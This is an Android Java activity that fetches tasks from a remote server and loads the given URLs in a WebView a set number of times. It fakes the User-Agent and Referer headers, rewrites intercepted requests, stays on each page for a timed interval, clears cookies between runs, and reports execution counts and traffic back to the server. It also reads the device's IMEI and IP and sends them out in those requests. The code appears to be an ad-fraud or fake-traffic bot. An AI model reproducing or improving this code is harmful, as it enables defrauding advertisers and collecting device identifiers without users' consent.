package com.example.adintegrate;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.net.TrafficStats;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.example.adintegrate.bean.ReplaceUrlBean;
import com.example.adintegrate.bean.RequestBean;
import com.example.adintegrate.bean.SucceedBean;
import com.example.adintegrate.bean.TaskBean;
import com.example.adintegrate.network.Constant;
import com.example.adintegrate.network.OkHttpHelper;
import com.example.adintegrate.utils.MyException;
import com.example.adintegrate.utils.MyTimerUtil;
import com.example.adintegrate.utils.ObtainUtil;
import com.example.adintegrate.utils.RandomSelectionUtil;
import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends Activity implements MyException {

    private final static String TAG = "MainActivity";
    //请求数据
    private RequestBean mRequestBean;
    //接收网络数据
    private TaskBean mTaskBean;
    //上传网络数据
    private SucceedBean mSucceedBean;
    private SucceedBean.DataBean mDataBean;
    //网络请求类
    private OkHttpHelper mOkHttpHelper;
    //webview加载的类型
    private String mLoadType;
    //执行的次数
    private int mExecTimes;
    //初始化次数
    private int mInitExecTimes;
    //时间控件
    private Timer mTimer;
    //停留的时间
    private int mStayTime;
    //计时器
    private MyTimerUtil mMyTimerUtil;
    //请求所用时间
    private int totalTime;
    //webview 加载处理
    private WebViewClient mWebViewClient;
    //加载的Webview
    private WebView mWebView;
    //User-Agent和Referer
    private String mUserAgentValue = "";
    private Map<String, String> mRefererParams;

    private String mReferer;
    private String mRefererTarget;
    //替换参数
    private List<ReplaceUrlBean> mReplaceUrlList;
    private Map<String, String> mReplaceParams;
    private Map<String, String> mReplaceTargetParams;
    //是否关闭
    private boolean mClose;
    //统计流量
    private long mStartByte, mEndByte;
    //webview 宽高
    private int mH, mW;
    //Imei,ip
    private String mIMEI;
    private String mIP;

    private CookieManager cookieManager = CookieManager.getInstance();


    @SuppressLint("HandlerLeak")
    private Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (msg.what == 0) {
                if (mInitExecTimes < mExecTimes) {
                    mMyTimerUtil.setCurrentSecond(0);
                    myLoadHeaderUrl(mReplaceTargetParams, mDataBean.getUrl());
                } else {
                    mTimer.cancel();
                    if (mClose) {
                        finish();
                    }
                }
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mWebView = new WebView(this);
        if (mWebView == null) {

        }
        initData();

        firstRequest();

        try {
            cookieManager.setCookie(mDataBean.getUrl(), "");
        } catch (NullPointerException e) {
            Log.i(TAG, "NullPointerException--------->" + e.toString());
        }
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setLoadWithOverviewMode(true);

        if (!mUserAgentValue.equals("")) {
            webSettings.setUserAgentString(mUserAgentValue);
        }
        mWebView.setLayoutParams(new ViewGroup.LayoutParams(mW, mH));

        myLoadHeaderUrl(mReplaceTargetParams, mDataBean.getUrl());
        mWebView.setWebViewClient(mWebViewClient);
        setContentView(mWebView);
    }

    private void initData() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        mClose = false;
        mInitExecTimes = 0;
        mW = 0;
        mH = 0;

        mRefererParams = new HashMap<>();

        mRefererTarget = "";

        mReplaceUrlList = new ArrayList<>();
        mReplaceParams = new HashMap<>();
        mReplaceTargetParams = new HashMap<>();

        mTimer = new Timer();
        mSucceedBean = new SucceedBean();

        mIMEI = ObtainUtil.getIMEI(this);
        mIP = ObtainUtil.getIPAddress(this);

        mDataBean = new SucceedBean.DataBean();
        mDataBean.setCid(mIMEI);
        mDataBean.setIp(mIP);

        mRequestBean = new RequestBean();
        mRequestBean.setCid(mIMEI);
        mRequestBean.setIp(mIP);

        mOkHttpHelper = OkHttpHelper.getInstance();
        mOkHttpHelper.setMyException(this);
        mMyTimerUtil = MyTimerUtil.getInstance();
        mWebViewClient = new WebViewClient() {

            @TargetApi(Build.VERSION_CODES.LOLLIPOP)
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString().trim();
                boolean isReplace = false;
                if (!TextUtils.isEmpty(url)) {
                    for (Map.Entry<String, String> map : mReplaceTargetParams.entrySet()) {
                        if (map.getValue().equals(Constant.INDIRECT) || map.getValue().equals(Constant.ALL)) {
                            for (Map.Entry<String, String> entry : mReplaceParams.entrySet()) {
                                if (entry.getValue().equals(Constant.OS)) {
                                    entry.setValue("0");
                                } else if (entry.getValue().equals(Constant.IMEI)) {
                                    entry.setValue(mIMEI);
                                } else if (entry.getValue().equals(Constant.IDFA)) {
                                    entry.setValue("");
                                } else if (entry.getValue().equals(Constant.IP)) {
                                    entry.setValue(mIP);
                                }
                                if (url.contains(entry.getKey())) {
                                    url = url.replace(entry.getKey(), entry.getValue());
                                    isReplace = true;
                                }
                            }
                        }
                    }
                    if (isReplace) {
                        Log.i(TAG, "url：" + url);
                        for (Map.Entry<String, String> entry : request.getRequestHeaders().entrySet()) {
                            Log.i("entryName", "----------------->" + entry.getKey());
                            Log.i("entryValue", "---------------->" + entry.getValue());
                        }

                        StringBuilder stringBuilder = myLoadResource(mRefererTarget, url);
                        return new WebResourceResponse("", "", new ByteArrayInputStream(stringBuilder.toString().getBytes()));
                    } else {
                        String myUrl = request.getUrl().toString();
                        return getNewResponse(myUrl, request.getRequestHeaders());
                    }
                }
                return super.shouldInterceptRequest(view, request);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                String CookieStr = cookieManager.getCookie(url);
                Log.i(TAG, "CookieStr：" + CookieStr);

                mMyTimerUtil.setPause(true);
                totalTime = mMyTimerUtil.getCurrentSecond();
                mInitExecTimes++;
                if(mTimer == null){
                    mTimer = new Timer();
                }
                mTimer.schedule(new TimerTask() {
                    @Override
                    public void run() {                // (1) 使用handler发送消息
                        Message message = new Message();
                        message.what = 0;
                        mHandler.sendMessage(message);
                    }
                }, mStayTime * 1000);//每隔一秒使用handler发送一下消息,也就是每隔一秒执行一次,一直重复执行
                if (mInitExecTimes == mExecTimes) {
                    CookieSyncManager.createInstance(MainActivity.this);
                    CookieManager.getInstance().removeAllCookie();
                    mClose = true;
                }
                mEndByte = TrafficStats.getUidRxBytes(ObtainUtil.getUid(MainActivity.this)) +
                        TrafficStats.getUidTxBytes(ObtainUtil.getUid(MainActivity.this));
                Log.i(TAG, mEndByte + "");
                Log.i(TAG, ObtainUtil.FormetFileSize(mEndByte) + "");
                Log.i(TAG, "traffic：" + (mEndByte - mStartByte));
                mSucceedBean.setFlow(Integer.parseInt((mEndByte - mStartByte) + ""));
                mStartByte = mEndByte;
                mDataBean.setIs_succeed(true);
                mDataBean.setExec_time((mStayTime + totalTime));
                mSucceedBean.setData(mDataBean);
                succeed(mSucceedBean);
                super.onPageFinished(view, url);
            }
        };
    }

    private void firstRequest() {
        mMyTimerUtil.setCurrentSecond(0);
        mMyTimerUtil.getMhandle().postDelayed(mMyTimerUtil.getTimeRunable(), 0);
        String json = new Gson().toJson(mRequestBean);
        mStartByte = TrafficStats.getUidRxBytes(ObtainUtil.getUid(this)) +
                TrafficStats.getUidTxBytes(ObtainUtil.getUid(this));

        Log.i(TAG, mStartByte + "");
        Log.i(TAG, ObtainUtil.FormetFileSize(mStartByte) + "");
        String response = "";
        try {
            response = mOkHttpHelper.post(Constant.TASK_URL, json);

        }catch (NullPointerException e){
            Toast.makeText(MainActivity.this, "服务器异常~", Toast.LENGTH_SHORT).show();
        }
        if (response.contains("Server Error")) {
            Toast.makeText(MainActivity.this, "Server Error~", Toast.LENGTH_SHORT).show();
            mMyTimerUtil.setPause(true);
            return;
        }
        Log.i(TAG,"response："+response);
        if(response.contains(" HTTP 404")){
            Toast.makeText(MainActivity.this, "服务器异常~", Toast.LENGTH_SHORT).show();
            return;
        }
        mTaskBean = new Gson().fromJson(response, TaskBean.class);
        if (mTaskBean == null) {
            Toast.makeText(MainActivity.this, "服务器异常~", Toast.LENGTH_SHORT).show();
            return;
        }
        TaskBean.DataBean.MessageBean messageBean = mTaskBean.getData().getMessage();
        mLoadType = messageBean.getExec_type();

        if (messageBean.getResolution() != null) {
            mW = Integer.parseInt(messageBean.getResolution().getW() + "");
            mH = Integer.parseInt(messageBean.getResolution().getH() + "");
        }

        if (!TextUtils.isEmpty(messageBean.getUa())) {
            mUserAgentValue = messageBean.getUa();
//            mHeaderParams.put(Constant.USER_AGENT, messageBean.getUa());
        }
        int refererSize = messageBean.getReferer() == null ? 0 : messageBean.getReferer().getValues().size();
        if (refererSize > 0) initReplaceReferer(messageBean.getReferer(), refererSize);
        int replaceSize = messageBean.getReplace() == null ? 0 : messageBean.getReplace().size();
        if (replaceSize > 0) initReplaceUrlParems(messageBean.getReplace());

        mLoadType = messageBean.getExec_type();
        mExecTimes = Integer.parseInt(messageBean.getExec_times() + "");
        mStayTime = Integer.parseInt(messageBean.getStay_time() + "");
        mDataBean.setTid(Integer.parseInt(messageBean.getTid() + ""));
        mDataBean.setUrl(messageBean.getExec_code() + "");
    }

    private void succeed(SucceedBean succeedBean) {
        String json = new Gson().toJson(succeedBean);
        String response = mOkHttpHelper.post(Constant.REPORT_URL, json);
        Log.i(TAG, response);
    }

    private void initReplaceReferer(TaskBean.DataBean.MessageBean.RefererBean refererBean, int refererSize) {
        //todo 随机生成
        int randomNumber = RandomSelectionUtil.getRandomNumber(0, refererSize);
        mReferer = refererBean.getValues().get(randomNumber);
        Log.i(TAG, "initReplaceReferer：mReferer--------------------->" + mReferer);
        mRefererParams.put(Constant.REFERER, mReferer);
        Log.i(TAG, "mHeaderParams：put--------------------->" + mRefererParams.toString());
        mRefererTarget = refererBean.getTarget();
        Log.i(TAG, "initReplaceReferer：mRefererTarget--------------------->" + mRefererTarget);
    }

    private void initReplaceUrlParems(List<TaskBean.DataBean.MessageBean.ReplaceBean> replaceBeanList) {
        for (TaskBean.DataBean.MessageBean.ReplaceBean replaceBean : replaceBeanList) {
            String tag = replaceBean.getTag();
            String value = replaceBean.getValue();
            String target = replaceBean.getTarget();
            mReplaceUrlList.add(new ReplaceUrlBean(tag, value, target));
            mReplaceParams.put(tag, value);
            mReplaceTargetParams.put(tag, target);
        }
    }

    private void myLoadHeaderUrl(Map<String, String> mReplaceTargetParams, String url) {
        url = myReplaceParams(mReplaceTargetParams, url);
        if (mRefererTarget.equals(Constant.DIRECT) || mRefererTarget.equals(Constant.ALL)) {
            if (mLoadType.equals(Constant.URL_JUMP)) {
                Log.i(TAG, "mHeaderParams：mLoadType--------------------->" + new Gson().toJson(mRefererParams));
                mWebView.loadUrl(url, mRefererParams);
//                mRefererParams.put(Constant.REFERER,mReferer);
                Log.i(TAG, "mHeaderParams：mLoadType2--------------------->" + new Gson().toJson(mRefererParams));
            } else {
                mWebView.loadDataWithBaseURL(null, url, "application/json", "utf-8", null);
            }
        } else {
            mWebView.loadUrl(url);
        }
    }


    private StringBuilder myLoadResource(String targetHeader, String url) {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = null;
        try {
            URL url1 = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url1.openConnection();
            httpURLConnection.setConnectTimeout(10 * 1000);
            httpURLConnection.setReadTimeout(10 * 1000);
            if (targetHeader.equals(Constant.INDIRECT) || targetHeader.equals(Constant.ALL)) {
                httpURLConnection.setRequestProperty(Constant.REFERER, mReferer);
            } else{
                httpURLConnection.setRequestProperty(Constant.REFERER,mDataBean.getUrl());
            }
            if (!mUserAgentValue.equals("")) {
                httpURLConnection.setRequestProperty(Constant.USER_AGENT, mUserAgentValue);
            }
            bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null)
                stringBuilder.append(line);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bufferedReader != null)
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
        }
        return stringBuilder;
    }

    private String myReplaceParams(Map<String, String> mReplaceTargetParams, String url) {
        String realUrl = url;
        for (Map.Entry<String, String> map : mReplaceTargetParams.entrySet()) {
            if (map.getValue().equals(Constant.DIRECT) || map.getValue().equals(Constant.ALL)) {
                for (Map.Entry<String, String> entry : mReplaceParams.entrySet()) {
                    if (entry.getValue().equals(Constant.OS)) {
                        entry.setValue("0");
                    } else if (entry.getValue().equals(Constant.IMEI)) {
                        entry.setValue(mIMEI);
                    } else if (entry.getValue().equals(Constant.IDFA)) {
                        entry.setValue("");
                    } else if (entry.getValue().equals(Constant.IP)) {
                        entry.setValue(mIP);
                    }
                    if (url.contains(entry.getKey())) {
                        realUrl = url.replace(entry.getKey(), entry.getValue());
                    }
                }
            }
        }
        Log.i("realUrl", "realUrl" + realUrl);
        return realUrl;
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            //按返回键操作并且能回退网页
            if (keyCode == KeyEvent.KEYCODE_BACK) {
                //后退
                finish();
                return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onDestroy() {
        if (mWebView != null) {
            mWebView.loadDataWithBaseURL(null, "", "text/html", "utf-8", null);
            mWebView.clearHistory();

            ((ViewGroup) mWebView.getParent()).removeView(mWebView);
            mWebView.destroy();
            mWebView = null;
            CookieSyncManager.createInstance(MainActivity.this);
            CookieManager.getInstance().removeAllCookie();
        }
        super.onDestroy();
    }

    private WebResourceResponse getNewResponse(String url, Map<String, String> headers) {
        try {
            OkHttpClient httpClient = new OkHttpClient();
            Request.Builder builder = new Request.Builder().url(url.trim()).addHeader(Constant.REFERER,mReferer);
            Set<String> keySet = headers.keySet();
            for (String key : keySet) {
                builder.addHeader(key, headers.get(key));
            }
            Request request = builder.build();
            final Response response = httpClient.newCall(request).execute();
            String conentType = response.header("Content-Type", response.body().contentType().type());
            String temp = conentType.toLowerCase();
            if (temp.contains("charset=utf-8")) {
                conentType = conentType.replaceAll("(?i)" + "charset=utf-8", "");
                //不区分大小写的替换
            }
            if (conentType.contains(";")) {
                conentType = conentType.replaceAll(";", "");
                conentType = conentType.trim();
            }
            return new WebResourceResponse(conentType, response.header("Content-Encoding", "utf-8"), response.body().byteStream());
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void show(String str) {
        Toast.makeText(MainActivity.this, str, Toast.LENGTH_SHORT).show();
    }
}
